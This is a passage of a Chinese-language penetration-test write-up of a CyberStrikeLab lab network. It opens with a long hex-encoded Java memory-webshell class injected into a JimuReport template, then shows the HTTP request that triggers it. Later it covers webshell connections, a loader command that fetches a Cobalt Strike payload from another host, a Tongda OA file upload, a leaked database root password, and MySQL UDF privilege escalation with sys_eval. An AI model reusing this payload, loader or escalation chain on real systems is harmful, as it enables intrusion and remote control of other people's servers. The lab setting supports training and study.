54562776d4d42396133647036434e5252726c6b363455534a64327853715635335579726f4571475a4f346a65427850684e4550716a6e4d2b4e4c4c2b58346f6e74676f347845637859414b6a6b56302f39326b6a2b68576e6c78714f4262474d44704332454f4756326c4377776a5655716b7938342f4647785053524b4f4e55784638464364624d597178454f496837474b3956554e346d6f3268776a4b4c344a544c5431726777663939444133506b4330473478424c4c54624a544a4f49574c4a542b4867724a6a484e7377774d70304f59385170706a64493166494c4a4937656a4a6376575362744159743373723632534344364654346678536567434f31595a5742567071435a6e5376756b5845787a704945644a305248673475325a4e34443863544d594151534f5a5867576265334e584873644a394347466d7766414f7174536e54556466533874706f696b346330794c6d5644796c56634a7a576446516351507765756d57654c4d2b6173494b34787a6f5a504f615251337a417663753733646270554373456158655263396a4d5977465042396d71747663436a766c56566a3738725a434f5456597a65576b4b625075477665396742655663463853324e62635273506e6e47616a5a3956314a50424176476c316668367668504579766b44586d64377559394a77727242747a644b7255764571586c4f52666f6b644b56732b58696a705256346d366a705569312f4256785778583474415130695a66594f794b636d4675374a5a48555339454c364662797353766b4d7346725a65744e516432367a52522f4264664539782f3330576537335257796f614a334b7931704c524c646e627a594a75646b505036326276636a396663313177325a6368564842656c5a47477a5a342b756c54526477303671434838677235795a612b7a377436674279344c356c6634745472666239774f355a4a7368764157652f4e4d67376d4733376b36474a6432767077564f4e7245532b4f326c58354e6d537553734a534c77414175342f6371674374553945776a7278717543725374743133444f325331554a6f766e2b5752447a664a53785049706d6d2b687574682f42453177726e704375454774575a565331317a4263766f47687849447939726b5053384b7842783756786c682f416e7071516e313530316a494f5a486c302f314e7554375133684e6c4e7953697270302b514f7554732b662b6238374d4c7a6d626b512f6f70643147454164416b2f6e3279712f4849703150586e66423579506f4e386f325435334d54524537543338584e54737450666558734a5736357934454f597a786161414f316f35584f626134514937674763743375786d657443665450796f4a366d6a624a7153335975495a614d2f766b365469656a66376d4f2f636e6f3336376a384e7431354c426a7477506273584d46656c73647659307a327a3330646739396d4459716e75334a4a58786f592f4350454f4a68427a7a69627650414254364d42326c42534a486a4554584f5865744d5873502b6d2b6a3134523934362b36414c3464724f50494758752b38695347427673417444453876345868664d42614d6e75446b75423954664a3359573339394b686277336750526a784867394530383630663075527649394c5845576f4b336b4a3157307a586b6f3838743457774e3556767754536472714e62776d5356384e7461536e434c7942594561766e674458363768367a56387334625859384561666a42314563472b6750397934444a5073677558634955552b70317a397a456c77434f63546641767958375a79657a7578516a7a6635715a3135464348767678496e3975584f49586c5375307549707576494e656836635263704667643979466836694a4131676b687739544c586b4d6b6376643549704d31564e304458766f537a68766365377a4f57394a2b765454703871432f312b346f6d456e6635363877624653355536797a7037717366384d45594e636555574d525839354178664839305a2f4b2b37675567312f324d7650743274596d74684857714933412b396859646f663755397a6152384835366239536234763363476237762f595252795a694e3579514d6855587941575542766657376b78466c686e4a2f6e73764f704964776a4847654d4a586a63583671776534496e422b3969484936795a6f2b6a41414f314761546c4979324d59707a4454484c31412f693577356d5763724c505a51575a2b36444153777050344558367376754751497a5558344d36443374774a3476384550365564326344506e43723145656e6e546f6b704e6850777630386e50673373583239436b4e663363526742623879684d2f6476724351622f775869564a59575867344141413d3d0c005b00ed0700ee0c00ef00f00c00f100f201003c6f72672e737072696e676672616d65776f726b2e7765622e636f6e746578742e726571756573742e52657175657374436f6e74657874486f6c6465720c00f300f401001467657452657175657374417474726962757465730c0084007f01000a6765745265717565737401000a67657453657373696f6e010011676574536572766c6574436f6e746578740100426f72672e737072696e676672616d65776f726b2e7765622e636f6e746578742e737570706f72742e5765624170706c69636174696f6e436f6e746578745574696c730100186765745765624170706c69636174696f6e436f6e7465787401000f6a6176612f6c616e672f436c61737301001c6a617661782e736572766c65742e536572766c6574436f6e746578740100106a6176612f6c616e672f4f626a6563740c008400850100136a6176612f6c616e672f457863657074696f6e0100316f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e4c6976654265616e73566965770c00f5006a0100136170706c69636174696f6e436f6e74657874730c007e007f0100176a6176612f7574696c2f4c696e6b6564486173685365740c00f600f70700f80c00f9006a0100356f72672e737072696e676672616d65776f726b2e7765622e636f6e746578742e5765624170706c69636174696f6e436f6e746578740c00fa00fb0c00fc00fd0c006100600c006200600c007500760c007700780100156a6176612f6c616e672f436c6173734c6f6164657201000b646566696e65436c6173730100025b420700fe0c00ff01000c010101020700eb0c010301040c010501060c010701080100136a6176612f6c616e672f5468726f7761626c650100076765744265616e01001c726571756573744d617070696e6748616e646c65724d617070696e6701001361646170746564496e746572636570746f72730100136a6176612f7574696c2f41727261794c6973740c0109010a01001673756e2e6d6973632e4241534536344465636f6465720c010b00f401000c6465636f64654275666665720c010c01020100106a6176612e7574696c2e42617365363401000a6765744465636f6465720100066465636f646501001d6a6176612f696f2f4279746541727261794f757470757453747265616d01001c6a6176612f696f2f427974654172726179496e70757453747265616d0c005b010d01001d6a6176612f7574696c2f7a69702f475a4950496e70757453747265616d0c005b010e0c010f01100c011101120c011301140c008000810701150c011600740c011701180c0119011a01001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c011b00fb0c011c011d0c011e00600c011f010a0c0120012101001f6a6176612f6c616e672f4e6f537563684d6574686f64457863657074696f6e0100206a6176612f6c616e672f496c6c6567616c416363657373457863657074696f6e01001a6a6176612f6c616e672f52756e74696d65457863657074696f6e0c012200600c0069006a0c0071006a0c007300740c005b012301001d6f72672f6170616368652f6c6f6767696e672f6c2f4b65795574696c73010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100136a6176612f696f2f494f457863657074696f6e010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e0100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e01002b6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e546172676574457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f6401001b5b4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b010015284c6a6176612f6c616e672f537472696e673b29560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000b6e6577496e7374616e63650100086974657261746f7201001628294c6a6176612f7574696c2f4974657261746f723b0100126a6176612f7574696c2f4974657261746f720100046e657874010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b010010697341737369676e61626c6546726f6d010014284c6a6176612f6c616e672f436c6173733b295a0100116a6176612f6c616e672f496e7465676572010004545950450100114c6a6176612f6c616e672f436c6173733b0100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a295601000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010007666f724e616d650100096765744d6574686f64010005285b422956010018284c6a6176612f696f2f496e70757453747265616d3b295601000472656164010005285b4229490100057772697465010007285b424949295601000b746f42797465417272617901000428295b420100176a6176612f6c616e672f7265666c6563742f4669656c64010003736574010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b01000d6765745375706572636c6173730100126765744465636c617265644d6574686f647301001d28295b4c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100076765744e616d65010006657175616c73010011676574506172616d65746572547970657301001428295b4c6a6176612f6c616e672f436c6173733b01000a6765744d657373616765010018284c6a6176612f6c616e672f5468726f7761626c653b295600210059005a0000000000110001005b005c0001005d0000001d00010001000000052ab70001b100000001005e000000060001000000180001005f00600001005d0000001b00010001000000031202b000000001005e0000000600010000001a0009006100600001005d0000001b00010000000000031203b000000001005e0000000600010000001e0009006200600002005d00000022000300000000000abb0004591205b70006b000000001005e00000006000100000022006300000004000100640001006500660002005d000000190000000300000001b100000001005e00000006000100000030006300000004000100670001006500680002005d000000190000000400000001b100000001005e000000060001000000350063000000040001006700090069006a0002005d00000123000700060000008bb80007b600084b014c2a1209b6000a120bb8000c4e2d120db8000c4d2c120eb8000c3a041904120fb8000c3a052a1210b6000a121104bd001259032a1213b6000a5304bd00145903190553b800154ca700044e2bc700352a1217b6000ab600181219b8001ac0001b4e2db6001cb9001d01004d2a121eb6000a2cb6001fb600209900052c4ca700044e2bb000020009004f0052001600570085008800160002005e00000046001100000038000700390009003d0015003e001c003f00240040002d0041004f004300520042005300450057004700690048007300490083004a0085004d0088004c00890050006b0000002a0005ff0052000207006c07006d000107006e00fc003107006dff0002000207006c07006d000107006e0000630000000a0004006f0070004f0051000a0071006a0002005d000000fa0006000600000074b80007b600084b014c2ab80021b6000ab600184ca7005e4db80022b80023b800244e1225122606bd001259031227535904b20028535905b2002853b600293a04190404b6002a19042a06bd001459032d53590403b8002b5359052dbeb8002b53b6002cc000123a051905b600184ca700044e2bb0000200090014001700160018006e0071002d0002005e00000036000d00000054000700550009005800140062001700590018005b0022005c0040005d0046005e0068005f006e00610071006000720064006b000000280003ff0017000207006c07006d000107006eff0059000307006c07006d07006e0001070072fa0000006300000004000100160009007300740001005d0000006f000700040000002e2a122e04bd0012590312045304bd00145903122f53b800154d2c1230b8001ac000314e2d2bb6003257a700044db1000100000029002c00160002005e0000001a0006000000690019006a0023006b0029006d002c006c002d006f006b0000000700026c07006e000008007500760002005d000000b000060004000000701233b800344c2b123504bd00125903120453b600362bb6001804bd001459032a53b6002cc00027c00027c00027b04d1237b800344c2b123803bd0012b600360103bd0014b6002c4e2db6001f123904bd00125903120453b600362d04bd001459032a53b6002cc00027c00027c00027b000010000002d002e00160002005e0000001a00060000007400060075002e0076002f00770035007800480079006b0000000600016e07006e00630000000a0004006f004f007000510009007700780002005d00000090000400060000003ebb003a59b7003b4cbb003c592ab7003d4dbb003e592cb7003f4e110100bc083a042d1904b600405936059b000f2b1904031505b60041a7ffeb2bb60042b000000002005e0000001e00070000007e0008007f00110080001a008100210084002d008500390088006b0000001c0002ff0021000507002707007907007a07007b0700270000fc001701006300000004000100640020007c007d0002005d00000027000300040000000b2b2cb800432b2db60044b100000001005e0000000a00020000008c000a008d006300000004000100160008007e007f0002005d0000003100020003000000112a2bb800434d2c04b600452c2ab60046b000000001005e0000000e00030000009000060091000b0092006300000004000100160008008000810002005d0000007b00030004000000282ab6001f4d2cc600192c2bb600474e2d04b600452db04e2cb600494da7ffe9bb0048592bb7004abf000100090015001600480002005e00000026000900000096000500980009009a000f009b0014009c0016009d0017009e001c009f001f00a2006b0000000d0003fc000507008250070083080063000000040001004800280084007f0002005d00000026000400020000000e2a2b03bd001203bd0014b80015b000000001005e000000060001000000a60063000000080003004f005100700029008400850002005d0000019700030009000000ca2ac1001299000a2ac00012a700072ab6001f3a04013a0519043a061905c700641906c6005f2cc700431906b6004b3a0703360815081907bea2002e1907150832b6004c2bb6004d9900191907150832b6004ebe9a000d19071508323a05a70009840801a7ffd0a7000c19062b2cb600293a05a7ffa93a071906b600493a06a7ff9d1905c7000cbb004f592bb70050bf190504b6002a2ac1001299001a1905012db6002cb03a07bb0052591907b60053b70054bf19052a2db6002cb03a07bb0052591907b60053b70054bf0003002500720075004f009c00a300a4005100b300ba00bb00510002005e0000006e001b000000aa001400ab001700ac001b00ae002500b0002900b1003000b3003b00b4005600b5005d00b6006000b3006600b9006900ba007200be007500bc007700bd007e00be008100c1008600c2008f00c4009500c5009c00c700a400c800a600c900b300cd00bb00ce00bd00cf006b0000002f000e0e43070082fe0008070082070086070082fd0017070087012cf900050208420700880b0d540700890e470700890063000000080003004f007000510008008a005c0001005d000000540003000100000017b80055b80056b80057a7000d4bbb0052592ab70058bfb1000100000009000c00160002005e000000160005000000270009002a000c0028000d00290016002b006b0000000700024c07006e090001008b00000002008c\&#34;), ClassLoader.getSystemClassLoader()))&#34;}}}},&#34;cols&#34;:{&#34;len&#34;:50},&#34;validations&#34;:[],&#34;autofilter&#34;:{},&#34;dbexps&#34;:[],&#34;dicts&#34;:[],&#34;loopBlockList&#34;:[],&#34;zonedEditionList&#34;:[],&#34;fixedPrintHeadRows&#34;:[],&#34;fixedPrintTailRows&#34;:[],&#34;rpbar&#34;:{&#34;show&#34;:true,&#34;pageSize&#34;:&#34;&#34;,&#34;btnList&#34;:[]},&#34;hiddenCells&#34;:[],&#34;hidden&#34;:{&#34;rows&#34;:[],&#34;cols&#34;:[]},&#34;background&#34;:false,&#34;area&#34;:false,&#34;dataRectWidth&#34;:0,&#34;excel_config_id&#34;:&#34;123456789&#34;,&#34;pyGroupEngine&#34;:false,&#34;querySetting&#34;:{&#34;izOpenQueryBar&#34;:false,&#34;izDefaultQuery&#34;:true}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>后用show接口触发代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /jmreport/show?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123123 HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 172.30.58.79:8085
</span></span><span class="line"><span class="cl">Content-Length: 98
</span></span><span class="line"><span class="cl">sec-ch-ua: &#34;Not-A.Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;124&#34;
</span></span><span class="line"><span class="cl">X-Tenant-Id: null
</span></span><span class="line"><span class="cl">JmReport-Tenant-Id: null
</span></span><span class="line"><span class="cl">sec-ch-ua-mobile: ?0
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
</span></span><span class="line"><span class="cl">tenantId: null
</span></span><span class="line"><span class="cl">Content-Type: application/json;charset=UTF-8
</span></span><span class="line"><span class="cl">Accept: application/json, text/plain, */*
</span></span><span class="line"><span class="cl">X-Access-Token: null
</span></span><span class="line"><span class="cl">token: null
</span></span><span class="line"><span class="cl">sec-ch-ua-platform: &#34;Windows&#34;
</span></span><span class="line"><span class="cl">Origin: http://172.30.58.79:8085
</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
</span></span><span class="line"><span class="cl">Referer: http://172.30.58.79:8085/jmreport/view/123456
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
</span></span><span class="line"><span class="cl">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1734512727,1734575289,1734580151,1734592701; HMACCOUNT=5325E852605ABB9A; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1734593609
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;id&#34;:&#34;123456789&#34;,&#34;apiUrl&#34;:&#34;&#34;,&#34;params&#34;:&#34;{\&#34;pageNo\&#34;:1,\&#34;pageSize\&#34;:10,\&#34;jmViewFirstLoad\&#34;:\&#34;1\&#34;}&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后用冰蝎连接，这里需要请求头，蚁剑也可以设置请求头，不过应该是别的师傅的poc的原因</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174844137.png"
	width="486"
	height="279"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174844137_hu14470511527494016806.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174844137_hu12572988760543019161.png 1024w"
	loading="lazy"
	
		alt="image-20260130174844137"
	
	
		class="gallery-image" 
		data-flex-grow="174"
		data-flex-basis="418px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174808917.png"
	width="928"
	height="397"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174808917_hu1455023796854387456.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174808917_hu2356367024804246926.png 1024w"
	loading="lazy"
	
		alt="image-20260130174808917"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="561px"
	
></p>
<p>可以直接读</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174930638.png"
	width="948"
	height="606"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174930638_hu17614187185120749614.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130174930638_hu12441765042583235062.png 1024w"
	loading="lazy"
	
		alt="image-20260130174930638"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="375px"
	
></p>
<h3 id="flag2-11">flag2
</h3><h4 id="知识点通达oa未授权文件上传数据库udf提权">知识点：通达OA未授权文件上传、数据库UDF提权
</h4><p>在<code>79</code>的根目录看到了一个<code>xshell</code>，应该跟<code>78</code>有关，不过我们77还没拿我们看看<code>79</code>有没有内网网卡，然后先上线CS吧、</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130175849088.png"
	width="482"
	height="310"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130175849088_hu10815322589000722191.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130175849088_hu12851479377782029333.png 1024w"
	loading="lazy"
	
		alt="image-20260130175849088"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="373px"
	
></p>
<p>没有网卡，看看杀软，上线CS吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist /svc
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130180041729.png"
	width="625"
	height="445"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130180041729_hu13176509796118093145.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130180041729_hu9369696456835839047.png 1024w"
	loading="lazy"
	
		alt="image-20260130180041729"
	
	
		class="gallery-image" 
		data-flex-grow="140"
		data-flex-basis="337px"
	
></p>
<p>好好，又是windows杀软，我们用掩日的网络分离打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4444.exe http://172.30.58.42:8888/S2/4444.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131130803224.png"
	width="844"
	height="512"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131130803224_hu9358275575924165208.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131130803224_hu10881712542813914725.png 1024w"
	loading="lazy"
	
		alt="image-20260131130803224"
	
	
		class="gallery-image" 
		data-flex-grow="164"
		data-flex-basis="395px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.30.58.42</td>
<td>外网机（拿下）</td>
</tr>
<tr>
<td>172.30.58.77</td>
<td>WIN-UPQLOPM011B 存在web服务</td>
</tr>
<tr>
<td>172.30.58.78</td>
<td>只开放了22端口</td>
</tr>
<tr>
<td>172.30.58.79</td>
<td>WIN-85B7F32VC8H 8085端口存在web服务（拿下）</td>
</tr>
</tbody>
</table></div>
<p>现在回过头去看<code>77</code>的机子，是个通达OA</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131142319.png"
	width="628"
	height="309"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131142319_hu10424839508555046421.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131142319_hu17765251925950555449.png 1024w"
	loading="lazy"
	
		alt="image-20260131131142319"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="487px"
	
></p>
<p>直接开suo</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131836978.png"
	width="1003"
	height="603"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131836978_hu13220958035866057321.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131131836978_hu10946243179372508274.png 1024w"
	loading="lazy"
	
		alt="image-20260131131836978"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="399px"
	
></p>
<p>蚁剑连接</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132105853.png"
	width="965"
	height="623"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132105853_hu10744252382501401894.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132105853_hu10270226946634537003.png 1024w"
	loading="lazy"
	
		alt="image-20260131132105853"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="371px"
	
></p>
<p>但是无法执行命令（好像这个后门就是无法执行命令的，需要数据库提权）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132244077.png"
	width="435"
	height="134"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132244077_hu170383605306436282.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132244077_hu11143049121455916838.png 1024w"
	loading="lazy"
	
		alt="image-20260131132244077"
	
	
		class="gallery-image" 
		data-flex-grow="324"
		data-flex-basis="779px"
	
></p>
<p>既然如此，翻一下数据库配置，获取密码</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132523543.png"
	width="400"
	height="313"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132523543_hu6934906151724604137.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131132523543_hu756789249530478351.png 1024w"
	loading="lazy"
	
		alt="image-20260131132523543"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="306px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root/HvaaOUr6n^v`_dyw@0YjA
</span></span></code></pre></td></tr></table>
</div>
</div><p>有数据库，但是蚁剑连不上，MUDT也连不上，不知道什么原因，这里做一个免杀的哥斯拉马上传到<code>webroot</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131142608777.png"
	width="1451"
	height="1044"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131142608777_hu16855052504684442550.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131142608777_hu9912759709689587439.png 1024w"
	loading="lazy"
	
		alt="image-20260131142608777"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="333px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131140114074.png"
	width="745"
	height="447"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131140114074_hu1799580976836297324.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131140114074_hu11251560014251643863.png 1024w"
	loading="lazy"
	
		alt="image-20260131140114074"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="400px"
	
></p>
<p>连接哥斯拉，后来发现蚁剑其实也连的上数据库，因为这个数据库端口在<code>3336</code>得改一下（又浪费一波时间）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131143417808.png"
	width="789"
	height="524"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131143417808_hu7578985483805054904.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131143417808_hu17144612106088276745.png 1024w"
	loading="lazy"
	
		alt="image-20260131143417808"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="361px"
	
></p>
<p>然后我们需要上传一个<code>lib_mysqludf_sys.dll</code>，这样提权，允许执行命令</p>
<p>这个<code>dll</code>是<code>kali</code>的<code>sqlmap</code>自带的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144234821.png"
	width="1154"
	height="523"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144234821_hu3927663719370120723.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144234821_hu14407420769629644885.png 1024w"
	loading="lazy"
	
		alt="image-20260131144234821"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>然后将<code>dll</code>文件上传到mysql5/lib/plugin目录下，这两个目录需要自己新建</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144753409.png"
	width="737"
	height="445"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144753409_hu434314886981256670.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144753409_hu15350825221617633610.png 1024w"
	loading="lazy"
	
		alt="image-20260131144753409"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p>然后在数据库中执行sql语句</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260131144912791.png"
	width="975"
	height="331"
